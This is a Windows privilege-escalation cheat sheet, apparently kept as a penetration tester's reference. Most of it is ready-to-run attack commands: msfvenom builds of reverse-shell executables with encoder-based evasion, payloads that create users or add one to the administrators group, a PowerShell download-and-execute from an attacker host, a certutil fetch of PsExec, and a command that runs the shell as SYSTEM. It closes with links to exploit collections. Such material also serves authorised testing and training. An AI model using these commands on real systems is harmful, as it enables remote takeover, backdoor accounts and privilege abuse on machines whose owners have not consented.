```
msfvenom -l                 # Payloads
msfvenom -l encoders        # Encoders

# MSFVENOM REVERSE SHELL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=9001 -f exe -o rvs.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=9001 -e shikata_ga_nai -i 3 -f exe -o rvs_encoded.exe


# MSFVENOM CREATE USER
msfvenom -p windows/adduser USER=<USERNAME> PASS=<PASSWORD> -f exe -o user.exe

# MSFVENOM EXECUTE COMMAND
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://$IP/nishang.ps1')\"" -f exe -o pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe -o pay.exe

# ESCALATE ADMIN USER TO SYSTEM PRIVILEGES
certutil -urlcache -f http://$IP/PsExec64.exe PsExec64.exe
.\PsExec64.exe -accepteula -i -s C:\PrivEsc\rvs.exe

```

# TOOLS
- [Watson](https://github.com/rasta-mouse/Watson)
- [Sherlock](https://github.com/rasta-mouse/Sherlock)
- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [WESNG](https://github.com/bitsadmin/wesng)
- [Windows Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/)
- [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)
- [SharpUp](https://github.com/GhostPack/SharpUp)

# EXPLOIT BINARIES
- [PoC auto collect from GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [Windows Exploits - Short List Pulled from SecWiki](https://github.com/abatchy17/WindowsExploits)
- [THE SecWiki Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)
